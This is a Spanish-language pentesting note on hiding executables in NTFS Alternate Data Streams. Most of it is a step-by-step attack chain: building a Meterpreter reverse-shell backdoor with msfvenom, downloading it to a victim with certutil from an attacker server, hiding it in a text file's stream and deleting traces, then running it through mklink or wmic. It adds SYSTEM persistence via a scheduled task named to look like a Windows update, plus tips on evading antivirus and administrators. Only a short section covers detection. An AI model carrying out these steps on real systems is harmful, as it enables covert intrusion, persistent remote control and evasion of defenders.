# 🕵️ ADS (Alternate Data Streams)

Los **Alternate Data Streams (ADS)** son una característica de NTFS que permite asociar metadatos o archivos adicionales a un archivo "anfitrión" sin cambiar su tamaño aparente ni su contenido visible. Para el sistema y el usuario, el archivo parece normal, pero esconde un segundo flujo de datos (el payload).

- **Requisito:** El sistema de archivos debe ser **NTFS** (no funciona en FAT32 o exFAT).
- **Visibilidad:** El Explorador de Archivos mostrará el tamaño original del archivo anfitrión. Si ocultas un `.exe` de 5 MB dentro de un `.txt` de 0 bytes, el archivo seguirá marcando 0 bytes.

## 🛠️ Metodología: Ocultar el Payload

La sintaxis básica para crear un ADS es `archivo_visible:nombre_flujo`.
### 1. Crear un flujo oculto (Texto)
Puedes ocultar mensajes o información sensible:
- `echo "Este es el mensaje oculto" > secreto.txt:mensaje`
- _Para leerlo:_ `notepad secreto.txt:mensaje`
### 2. Ocultar un Payload (Binario/Ejecutable)
Supongamos que tenemos un payload generado con [[Msfvenom]] llamado `shell.exe` y queremos esconderlo en un archivo de texto inofensivo:
- `type shell.exe > readme.txt:proceso.exe`
- **Resultado:** `readme.txt` parece un archivo de texto normal. `shell.exe` puede ser borrado de la carpeta original, ya que ahora vive "dentro" del flujo alternativo de `readme.txt`.
## 🚀 Ejecución del Payload Oculto

Desde Windows 7, Microsoft bloqueó la ejecución directa de archivos en ADS (ej. `start archivo:flujo.exe` ya no funciona directamente). Sin embargo, existen varios "bypasses":

### Método A: Usando Enlaces Simbólicos (Symlinks)
Es el método más común y efectivo:

1. Creamos un enlace simbólico que apunte al flujo oculto:
	- `mklink C:\Windows\Temp\link.exe C:\ruta\readme.txt:proceso.exe`
2. Ejecutamos el enlace:
	- `C:\Windows\Temp\link.exe`
### Método B: Usando WMIC (Windows Management Instrumentation)
Podemos llamar al proceso oculto mediante WMI:
- `wmic process call create "C:\ruta\readme.txt:proceso.exe"`

## 🔍 Detección de ADS
Como auditor, debes saber cómo encontrar estos flujos ocultos, ya que no se ven a simple vista.

**Desde CMD:**
- `dir /R
- La opción `/R` listará todos los flujos alternativos asociados a los archivos de la carpeta.`

**Desde PowerShell:**
- `Get-Item -Path * -Stream *`
## 🛠️ Ejemplo Completo (En Windows)
### 🛠️ Paso 1: Creación del Payload ([[Msfvenom]])
En nuestra máquina Kali, generamos el ejecutable de la reverse shell. Lo llamaremos `backdoor.exe`.
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe > backdoor.exe`
### 🛠️ Paso 2: Transferencia al Objetivo
Levantamos un servidor rápido en Kali para que la víctima pueda descargar el archivo.

1. **En Kali:** `python3 -m http.server 80`
2. **En la Víctima (CMD/Powershell):**
	- `certutil -urlcache -f http://<TU_IP>/backdoor.exe C:\Temp\backdoor.exe`
### 🛠️ Paso 3: Ocultación con ADS
Supongamos que en la carpeta `C:\Temp` existe un archivo inofensivo llamado `notas.txt` (o créalo con `echo "Lista de tareas" > notas.txt`).

Vamos a "inyectar" nuestro ejecutable dentro del flujo alternativo de ese archivo de texto.

1. **Inyectar el payload:**
	- `type C:\Temp\backdoor.exe > C:\Temp\notas.txt:shell.exe`
2. **Limpiar rastros:** Borra el archivo original que transferiste para que no quede rastro del `.exe` visible.
	- `del C:\Temp\backdoor.exe

> [!danger] **Verificación de invisibilidad:** Si haces un `dir`, verás que `notas.txt` sigue midiendo unos pocos bytes. Sin embargo, si haces un `dir /R`, verás el flujo oculto:
### 🛠️ Paso 4: Preparar el Listener en Kali
Antes de ejecutar, debemos estar a la escucha en Metasploit:

- `use exploit/multi/handler`
- `set PAYLOAD windows/x64/meterpreter/reverse_tcp` _(Mismo que el payload generado con msfvenom)_
- `set LHOST <TU_IP>`
- `set LPORT 4444`
- `run`
### 🛠️ Paso 5: Ejecución del Payload Escondido
Como Windows bloquea la ejecución directa de flujos (ej. `start notas.txt:shell.exe` fallará), usamos el método de **Enlaces Simbólicos**, que es el más fiable en versiones modernas.

1. **Crear el enlace (Requiere privilegios o modo desarrollador):**
	- `mklink C:\Temp\run_me.exe C:\Temp\notas.txt:shell.exe`
2. Ejecutar:
	- `C:\Temp\run_me.exe`

Alternativa con WMIC (Si no puedes crear symlinks):
- `wmic process call create "C:\Temp\notas.txt:shell.exe"`

### 🕒 Persistencia con Tareas Programadas y ADS
El objetivo es crear una tarea en el Programador de Tareas de Windows que llame a nuestro ejecutable escondido dentro del flujo alternativo.
#### 🛠️ Paso 1: Crear la Tarea Programada
Utilizaremos el comando `schtasks`. Este comando nos permite programar acciones desde la línea de comandos (CMD o PowerShell).

**Comando de creación:**
- `schtasks /create /sc minute /mo 1 /tn "WindowsUpdateCheck" /tr "wmic process call create 'C:\Temp\notas.txt:shell.exe'" /ru System`
##### Desglose del comando:

- `/create`: Indica que queremos generar una nueva tarea.
- `/sc minute /mo 1`: Define el horario (**S**chedule). En este caso, cada **1 minuto**.
- `/tn "WindowsUpdateCheck"`: Es el **T**ask **N**ame. Usamos un nombre que parezca legítimo para no levantar sospechas.
- `/tr "..."`: Es la **T**ask **R**un (la acción). Aquí es donde usamos el bypass de **WMIC** para ejecutar el flujo ADS oculto.
- `/ru System`: (Opcional) Indica que la tarea debe ejecutarse con privilegios de **SYSTEM**. 
  _Nota: Esto requiere que ya seas Administrador al crear la tarea._
### 🛠️ Paso 2: Verificar la Tarea
Es importante confirmar que la tarea se ha registrado correctamente en el sistema:

- `schtasks /query /tn "WindowsUpdateCheck" /fo LIST /v`
- Esto nos mostrará la próxima hora de ejecución y el comando que lanzará.

### ¿Qué ocurre si la conexión se corta?

1. Windows esperará exactamente 60 segundos.
2. El **Task Scheduler** lanzará el proceso en segundo plano.
3. El proceso ejecutará el payload escondido en el ADS (`notas.txt:shell.exe`).
4. Nuestra máquina Kali recibirá una nueva conexión de Meterpreter.
5. **Resultado:** Obtendrás acceso instantáneo sin que el usuario haya hecho nada.

### 🛠️ Paso 3: Preparar el Multi/Handler (Persistencia Infinita)
Para que esto funcione de forma fluida, en **Metasploit** debemos configurar el listener para que no se cierre después de recibir la primera sesión.

1. Carga el handler: `use exploit/multi/handler`
2. Configura tu IP y Puerto.
3. **Configuración de persistencia:**
	- `set ExitOnSession false`: Hace que el listener siga escuchando aunque ya haya recibido una conexión.
	- `run -j`: Ejecuta el exploit como un "Job" en segundo plano.

## 🚩 Notas para Persistencia

1. **Discreción (El factor "Ruido"):**
    - Ejecutar un Meterpreter cada minuto es **extremadamente ruidoso**. Si el usuario tiene un Antivirus (como Windows Defender), detectará el patrón de red constante.
    - **Mejora:** En lugar de ejecutarlo cada minuto, usa `/sc onlogon` (se ejecuta cuando el usuario inicia sesión) o `/sc daily /st 09:00` (una vez al día).
2. **Evitar la detección:**
    - Si creas un proceso con nombre evidente, por ejemplo, `Backdoor` si un administrador abre el Task Scheduler, sospechará. Asegúrate de usar nombres como `WinUpdateService`, `SystemDriverCheck` o `MS-Diagnostics-Log`, fáciles de pasar por alto.
3. **Rutas Inteligentes:**
	- En lugar de `C:\Temp`, intenta esconder el archivo anfitrión en carpetas del sistema como `C:\ProgramData` o dentro de `AppData` del usuario.
4. **Limpieza:**
    - Si decides borrar la persistencia más tarde, no olvides eliminarla:
	- `schtasks /delete /tn "WindowsUpdateCheck" /f`
## 🚩 Notas de Pentesting

- **Persistencia:** Es una técnica excelente para esconder herramientas de post-explotación (como `nc.exe` o `mimikatz.exe`) en el sistema de la víctima sin levantar sospechas inmediatas.
- **Limitación:** Si el archivo se mueve a una unidad USB formateada en FAT32 o se envía por correo/nube que no soporte flujos NTFS, los datos ocultos **se perderán**.

--- 
**Navegación:**
- [[Técnicas]]